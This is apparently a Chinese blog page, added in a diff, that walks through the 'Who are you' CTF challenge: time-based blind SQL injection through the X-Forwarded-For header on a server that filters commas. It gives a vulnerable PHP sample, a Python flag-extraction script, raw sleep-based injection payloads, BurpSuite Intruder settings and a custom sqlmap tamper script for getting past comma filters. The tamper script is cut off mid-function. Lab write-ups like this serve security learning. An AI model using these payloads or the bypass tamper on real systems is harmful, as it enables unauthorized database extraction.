@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Ovie博客
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            实验吧CTF - Who are you
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h2 id="Who-are-you"><a href="#Who-are-you" class="headerlink" title="Who are you"></a>Who are you</h2><p><a href="http://www.shiyanbar.com/ctf/1941" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/1941</a></p>
+<p>题目：</p>
+<blockquote>
+<p>我要把攻击我的人都记录db中去!</p>
+<p>格式ctf{}</p>
+</blockquote>
+<p>解题：</p>
+<p>访问链接，页面显示<code>your IP is XX.XX.XX.XX</code>，知道这是一个关于IP伪造。</p>
+<p>尝试各种伪造IP的HTTP头：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For</span><br><span class="line">Client-IP</span><br><span class="line">x-remote-IP</span><br><span class="line">x-originating-IP</span><br><span class="line">x-remote-addr</span><br></pre></td></tr></table></figure>
+
+<p>发现X-Forwarded-For可以伪造。</p>
+<p><img src="ctf_who_are_you_1.png" alt="ctf_who_are_you_1.png"></p>
+<p>题目说：</p>
+<blockquote>
+<p>我要把攻击我的人都记录db中去!</p>
+</blockquote>
+<p>可以猜测这是一个INSERT INTO的注入。</p>
+<p>尝试各种注入，发现注入的语句给原封不动地显示在页面中，但，如果注入的语句有逗号，则后面的内容就不会显示在页面中。 </p>
+<p><img src="ctf_who_are_you_2.png" alt="ctf_who_are_you_2.png"></p>
+<p>所以，猜测逗号后面的内容给截掉了。</p>
+<p>入了一个坑，导致想不到怎么注入：</p>
+<p>一直觉得后台程序的逻辑是这样的：取X-Forwarded-For的内容，去掉逗号后的内容，再拼接INSERT INTO的SQL语句，写到数据库中，再用SELECT语句从数据库取出（那程序怎么确定现在取回的值就是刚刚插入的值呢？显然这不能保证。），显示在页面中。</p>
+<p>入了这个坑，就觉得注入的语句没有逃脱单引号的包围，注入的X-Forwarded-For内容被原封不动地写进了数据库中。</p>
+<p>看了Writeup之后才知道这是time-based盲注。</p>
+<p>所以想后台程序的逻辑差不多是这样：取X-Forwarded-For的值，去掉逗号后的内容，剩下的存在一个变量里，假设变量名是tmp，然后再拼接到INSERT INTO语句中，执行SQL语句。最后再把tmp的内容显示在页面中。</p>
+<p>后台代码可能是这样：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">      $ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     $ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">   $ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line">   <span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">"root"</span>;</span><br><span class="line">$pass=<span class="string">"root"</span>;</span><br><span class="line">$db=<span class="string">"sangebaimao"</span>;</span><br><span class="line"> </span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"> </span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"> </span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>所以这不能利用真值注入，报错注入等，只能尝试基于时间的注入。</p>
+<p><strong>入了坑，要懂得跳出来。  当设想的程序逻辑跟试验结果不符合，就要尝试另外的设想、思路。</strong></p>
+<p>做这道题，用三种方法：</p>
+<blockquote>
+<ol>
+<li><p>用Python脚本跑。</p>
+</li>
+<li><p>利用BurpSuite进行基于时间的盲注。</p>
+</li>
+<li><p>自己写tamper来使用sqlmap绕过 服务端对逗号的过滤 进行time-based注入（修改queries.xml这个方法不行）</p>
+</li>
+</ol>
+</blockquote>
+<h3 id="0x01-用Python脚本跑"><a href="#0x01-用Python脚本跑" class="headerlink" title="0x01 用Python脚本跑"></a>0x01 用Python脚本跑</h3><p>事先确定了flag存储在flag表的flag字符里，且flag的长度为32，</p>
+<p>一个简陋的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">"http://xxx"</span></span><br><span class="line">guess=string.lowercase + string.uppercase + string.digits</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">   <span class="keyword">for</span> str <span class="keyword">in</span> guess:</span><br><span class="line">     headers=&#123;<span class="string">"x-forwarded-for"</span>:<span class="string">"xx'+"</span>+<span class="string">"(select case when (substring((select flag from flag ) from %d for 1 )='%s') then sleep(5) else 1 end ) and '1'='1"</span> %(i,str)&#125;</span><br><span class="line">     <span class="keyword">try</span>: </span><br><span class="line">         res=requests.get(url,headers=headers,timeout=<span class="number">4</span>)</span><br><span class="line">     <span class="keyword">except</span> requests.exceptions.ReadTimeout, e:</span><br><span class="line">         flag = flag + str</span><br><span class="line">         <span class="keyword">print</span> <span class="string">"flag:"</span>, flag</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'result:'</span> + flag</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x02-利用BurpSuite进行基于时间的盲注"><a href="#0x02-利用BurpSuite进行基于时间的盲注" class="headerlink" title="0x02 利用BurpSuite进行基于时间的盲注"></a>0x02 利用BurpSuite进行基于时间的盲注</h3><p>参考：<a href="https://depthsecurity.com/blog/blind-sql-injection-burpsuite-like-a-boss" target="_blank" rel="noopener">https://depthsecurity.com/blog/blind-sql-injection-burpsuite-like-a-boss</a></p>
+<p>下面是几个要点：</p>
+<h4 id="1-设置代理"><a href="#1-设置代理" class="headerlink" title="1.设置代理"></a>1.设置代理</h4><p>每次开BurpSuite这个工具都要设置代理，这是很麻烦的。通常使用浏览器的设置选项设置代理会比较方便点。</p>
+<p>如在Chrome浏览器设置代理：</p>
+<p><img src="ctf_who_are_you_3.png" alt="ctf_who_are_you_3.png"></p>
+<p>更方便的方法是，使用插件。如在Chrome浏览器中使用SwitchyOmega插件来切换代理。这里就不说SwitchyOmega的使用了。</p>
+<h4 id="2-BurpSuite如何判断是否超时"><a href="#2-BurpSuite如何判断是否超时" class="headerlink" title="2.BurpSuite如何判断是否超时"></a>2.BurpSuite如何判断是否超时</h4><p>首先有个问题，我们如何在BurpSuite得知后台因为SQL的执行而有延迟产生。这需要一点设置。</p>
+<p>Options-&gt;Connections-&gt;Tiimeouts-&gt;Normal这一空 改成你想要的超时时间（默认为120秒）。</p>
+<p><img src="ctf_who_are_you_4.png" alt="ctf_who_are_you_4.png"></p>
+<p>在进行Intruder攻击时，如果连接超时，则状态码和length一栏为空。由此可以判断连接是否超时。</p>
+<p>需要注意的是：在开始Intruder攻击前，需要把Intruder-&gt;Options-&gt;Request Engine-&gt;Number of threads的<strong>线程数改成1</strong>，否则将导致前一个请求的延时造成后一个请求延时，这就使判断不正确了。</p>
+<h4 id="3-使用BurpSuite进行HTTP头注入需要注意什么"><a href="#3-使用BurpSuite进行HTTP头注入需要注意什么" class="headerlink" title="3.使用BurpSuite进行HTTP头注入需要注意什么"></a>3.使用BurpSuite进行HTTP头注入需要注意什么</h4><ol>
+<li>在Proxy-&gt;Intercept-&gt;Raw修改数据包内容时：当这个请求没有POST参数，要求最后空两行，否则数据包将发送不成功；当这个请求有POST参数，要求headers与POST参数之间空一行。</li>
+</ol>
+<p><img src="ctf_who_are_you_5.png" alt="ctf_who_are_you_5.png"></p>
+<p>   建议在Proxy-&gt;Intercept-&gt;headers一栏里修改请求包的Headers。</p>
+<ol start="2">
+<li>在开始Intruder攻击前，Intruder-&gt;Payloads-&gt;Payload Encoding的URL-encode these characters的勾要去掉，即不让BurpSuite对payload进行URL编码。</li>
+</ol>
+<h4 id="4-BurpSuite-Intruder的Attack-Type"><a href="#4-BurpSuite-Intruder的Attack-Type" class="headerlink" title="4.BurpSuite Intruder的Attack Type"></a>4.BurpSuite Intruder的Attack Type</h4><p>本次time-based注入需要选择Cluster bome这个Attack Type</p>
+<p>有关BurpSuite的Attack Type参考：<a href="http://blog.csdn.net/u012804180/article/details/52015224" target="_blank" rel="noopener">http://blog.csdn.net/u012804180/article/details/52015224</a></p>
+<p>下面是具体的攻击步骤：</p>
+<p>先设定Burpsuite的Timeout为4秒：</p>
+<p><img src="ctf_who_are_you_6.png" alt="ctf_who_are_you_6.png"></p>
+<p>抓取数据包，并发送到Repeater。</p>
+<p>事先验证flag记录的长度，用以下语句来注入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and (select case when (select length(flag) from flag limit 1)&#x3D;32 then sleep(5) else 1 end) and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="ctf_who_are_you_7.png" alt="ctf_who_are_you_7.png"></p>
+<p>当点击Repeter的Go按钮，等待了约五秒，Go按钮从不可按状态转为可按状态，cancel按钮从可按状态转为不可按状态，Reponse没有任何返回，且Burpsuite 的Alerts模块里新增一个Timeout的提示。就表明后台延时了5秒。</p>
+<p>这就可以确定其长度为32了。</p>
+<p>把数据包发送到Intruder。</p>
+<p>构造注入语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and (select case when (select ord(substring(flag from 1 for 1)) from flag limit 1) &#x3D; 2 then sleep(5) else 1 end) and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<p>其中，表名flag和字段名flag存在可以由以下注入语句来确认：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and exists(select flag from flag) and sleep(5) and &#39;1&#39; &#x3D; &#39;1</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在两处位置add $，并设置Attack Type为Cluster bomb：</p>
+<p><img src="ctf_who_are_you_8.png" alt="ctf_who_are_you_8.png"></p>
+<p>设置Payload1：</p>
+<p><img src="ctf_who_are_you_9.png" alt="ctf_who_are_you_9.png"></p>
+<p>设置Payload2：</p>
+<p><img src="ctf_who_are_you_10.png" alt="ctf_who_are_you_10.png"></p>
+<p>把Payload1和Payload2的URL-encode取消掉：</p>
+<p><img src="ctf_who_are_you_11.png" alt="ctf_who_are_you_11.png"></p>
+<p>设置线程数为1：</p>
+<p><img src="ctf_who_are_you_12.png" alt="ctf_who_are_you_12.png"></p>
+<p>万事具备，开始攻击。Inturder-&gt;Start Attack</p>
+<p><img src="ctf_who_are_you_13.png" alt="ctf_who_are_you_13.png"></p>
+<p>像这些，Status一栏跟Length一栏为空的请求就是超时的。</p>
+<p>利用这些就可以得到flag的ASCII值，再转码就得到flag！</p>
+<h3 id="0x03-使用sqlmap绕过-服务端对逗号的过滤"><a href="#0x03-使用sqlmap绕过-服务端对逗号的过滤" class="headerlink" title="0x03 使用sqlmap绕过 服务端对逗号的过滤"></a>0x03 使用sqlmap绕过 服务端对逗号的过滤</h3><h4 id="1-使用sqlmap进行HTTP头注入"><a href="#1-使用sqlmap进行HTTP头注入" class="headerlink" title="1.使用sqlmap进行HTTP头注入"></a>1.使用sqlmap进行HTTP头注入</h4><p>首先，得知道怎么用sqlmap进行HTTP头注入。</p>
+<p>方法：</p>
+<p>利用-r 参数指定存储着数据包的文件，并用*号来告诉sqlmap哪里是注入点。</p>
+<p>这道题的数据包内容是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;web&#x2F;wonderkun&#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: ctf5.shiyanbar.com</span><br><span class="line">Proxy-Connection: keep-alive</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;47.0.2526.111 Safari&#x2F;537.36</span><br><span class="line">X-Forwarded-For: 1*</span><br><span class="line">Referer: http:&#x2F;&#x2F;www.shiyanbar.com&#x2F;ctf&#x2F;1941</span><br><span class="line">Accept-Encoding: gzip, deflate, sdch</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8</span><br></pre></td></tr></table></figure>
+
+<p>另外，User-Agent、Cookie、Referer的值中可能有*号，这会让sqlmap去测试这些我们不需要测试的地方，这时，可以使用<code>--skip SKIP</code>参数来指示哪里不需要被测试，如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--skip&#x3D;&quot;user-agent,referer&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2-尝试修改queries文件（不可行）"><a href="#2-尝试修改queries文件（不可行）" class="headerlink" title="2.尝试修改queries文件（不可行）"></a>2.尝试修改queries文件（不可行）</h4><p>文件是在<code>sqlmap/xml</code>目录下的queries.xml</p>
+<p>可以说这个文件<strong>存储着sqlmap构造SQL语句的模板</strong>，其部分内容如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- MySQL --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dbms</span> <span class="attr">value</span>=<span class="string">"MySQL"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">cast</span> <span class="attr">query</span>=<span class="string">"CAST(%s AS CHAR)"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">length</span> <span class="attr">query</span>=<span class="string">"CHAR_LENGTH(%s)"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">isnull</span> <span class="attr">query</span>=<span class="string">"IFNULL(%s,' ')"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">delimiter</span> <span class="attr">query</span>=<span class="string">","</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">limit</span> <span class="attr">query</span>=<span class="string">"LIMIT %d,%d"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">limitregexp</span> <span class="attr">query</span>=<span class="string">"\s+LIMIT\s+([\d]+)\s*\,\s*([\d]+)"</span> <span class="attr">query2</span>=<span class="string">"\s+LIMIT\s+([\d]+)"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">limitgroupstart</span> <span class="attr">query</span>=<span class="string">"1"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">limitgroupstop</span> <span class="attr">query</span>=<span class="string">"2"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">limitstring</span> <span class="attr">query</span>=<span class="string">" LIMIT "</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">order</span> <span class="attr">query</span>=<span class="string">"ORDER BY %s ASC"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">count</span> <span class="attr">query</span>=<span class="string">"COUNT(%s)"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">comment</span> <span class="attr">query</span>=<span class="string">"-- "</span> <span class="attr">query2</span>=<span class="string">"/*"</span> <span class="attr">query3</span>=<span class="string">"#"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">substring</span> <span class="attr">query</span>=<span class="string">"MID((%s),%d,%d)"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">concatenate</span> <span class="attr">query</span>=<span class="string">"CONCAT(%s,%s)"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">case</span> <span class="attr">query</span>=<span class="string">"SELECT (CASE WHEN (%s) THEN 1 ELSE 0 END)"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hex</span> <span class="attr">query</span>=<span class="string">"HEX(%s)"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">inference</span> <span class="attr">query</span>=<span class="string">"ORD(MID((%s),%d,1))&gt;%d"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">banner</span> <span class="attr">query</span>=<span class="string">"VERSION()"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">current_user</span> <span class="attr">query</span>=<span class="string">"CURRENT_USER()"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">current_db</span> <span class="attr">query</span>=<span class="string">"DATABASE()"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hostname</span> <span class="attr">query</span>=<span class="string">"@@HOSTNAME"</span>/&gt;</span></span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>
+
+<p>我们可以修改<code>&lt;isnull query=&quot;IFNULL(%s,&#39; &#39;)&quot;/&gt;</code>一项为<code>&lt;isnull query=&quot;(SELECT %s)&quot;&gt;</code> ，这就避免了使用逗号，还有<code>&lt;inference query=&quot;ORD(MID((%s),%d,1))&gt;%d&quot;/&gt;</code>可以改为<code>&lt;inference query=&quot;ORD(MID((%s) from %d for 1))&gt;%d&quot;/&gt;</code>，诸如此，等等。</p>
+<p>不过，为什么这个方法绕不过服务器对逗号的过滤呢？因为sqlmap要使用IF函数，这个函数中有逗号，而且，queries文件里不可以针对IF函数来修改。</p>
+<p>参考乌云文章：SQLMAP进阶使用  <a href="http://drops.wooyun.org/tips/5254" target="_blank" rel="noopener">http://drops.wooyun.org/tips/5254</a></p>
+<h4 id="3-自己写tamper"><a href="#3-自己写tamper" class="headerlink" title="3.自己写tamper"></a>3.自己写tamper</h4><p>参考下sqlmap/tamper/目录下的文件，就可以自己写出简单的tamper。</p>
+<p>写tamper的思路也很简单：把sqlmap会用到逗号的语句用其他不含有逗号的语句替代。</p>
+<p>自己写了一个很简陋的tamper，名为commalessmysql.py，放在sqlmap/tamper目录下。（这个脚本只适用MySQL）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Writed by Ovie 2016-12-05</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Replaces some instances with something whthout comma </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Requirement:</span></span><br><span class="line"><span class="string">        * MySQL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tested against:</span></span><br><span class="line"><span class="string">        * MySQL 5.0</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper('ISNULL(TIMESTAMPADD(MINUTE,7061,NULL))')</span></span><br><span class="line"><span class="string">    'ISNULL(NULL)'</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper('MID(VERSION(), 2, 1)')</span></span><br><span class="line"><span class="string">    'MID(VERSION() FROM 2 FOR 1)'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper('IF(26=26,0,5)')</span></span><br><span class="line"><span class="string">    'CASE WHEN 26=26 THEN 0 ELSE 5 END'</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper('IFNULL(NULL,0x20)')</span></span><br><span class="line"><span class="string">    'CASE WHEN NULL=NULL THEN 0x20 ELSE NULL END'</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper('LIMIT 2, 3')</span></span><br><span class="line"><span class="string">    'LIMIT 3 OFFSET 2'</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">commalessif</span><span class="params">(payload)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> payload <span class="keyword">and</span> payload.find(<span class="string">"IF"</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">while</span> payload.find(<span class="string">"IF("</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                index = payload.find(<span class="string">"IF("</span>)</span><br><span class="line">                depth = <span class="number">1</span></span><br><span class="line">                comma1, comma2, end = <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> xrange(index + len(<span class="string">"IF("</span>), len(payload)):</span><br><span class="line">                    <span class="keyword">if</span> depth == <span class="number">1</span> <span class="keyword">and</span> payload[i] == <span class="string">','</span> <span class="keyword">and</span> <span class="keyword">not</span> comma1:</span><br><span class="line">                        comma1 = i</span><br><span class="line">                        </span><br><span class="line">                    <span class="keyword">elif</span> depth == <span class="number">1</span> <span class="keyword">and</span> payload[i] == <span class="string">','</span> <span class="keyword">and</span> comma1:</span><br><span class="line">                        comma2 = i</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">elif</span> depth == <span class="number">1</span> <span class="keyword">and</span> payload[i] == <span class="string">')'</span>:</span><br><span class="line">                        end = i</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">elif</span> payload[i] == <span class="string">'('</span>:</span><br><span class="line">                        depth += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">elif</span> payload[i] == <span class="string">')'</span>:</span><br><span class="line">                        depth -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> comma1 <span class="keyword">and</span> comma2 <span class="keyword">and</span> end:</span><br><span class="line">                    _ = payload[index + len(<span class="string">"IF("</span>):comma1]</span><br><span class="line">                    __ = payload[comma1 + <span class="number">1</span>:comma2]</span><br><span class="line">                    ___ = payload[comma2 + <span class="number">1</span>:end]</span><br><span class="line">                    newVal = <span class="string">"CASE WHEN %s THEN %s ELSE %s END"</span> % (_, __, ___)</span><br><span class="line">                    payload = payload[:index] + newVal + payload[end + <span class="number">1</span>:]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                    </span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">commalessifnull</span><span 